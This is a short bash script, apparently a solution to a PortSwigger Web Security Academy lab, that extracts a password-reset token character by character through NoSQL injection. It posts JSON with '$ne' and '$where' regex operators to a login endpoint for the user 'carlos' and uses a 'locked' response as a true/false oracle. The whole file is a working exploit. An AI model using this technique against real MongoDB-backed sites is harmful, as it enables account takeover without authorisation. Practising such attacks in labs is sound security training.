#!/bin/bash
alphabet=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_
index=01234567890123456789
for (( j=0; j<${#index}; j++ )); do
  for (( i=0; i<${#alphabet}; i++ )); do
    char="${alphabet:$i:1}"
    baseURL=0a7f00c1047643448060e95100f8004f.web-security-academy.net
    if [[ $(curl  --header "Content-Type: application/json" -s https://$baseURL/login --data "{\"username\":\"carlos\",\"password\":{\"\$ne\":\"\"}, \"\$where\":\"this.newPwdTkn.match('^.{$j}$char.*\$')\"}" | grep locked) ]]; then
      echo "token[$j] = $char"
      break
    fi
  done
done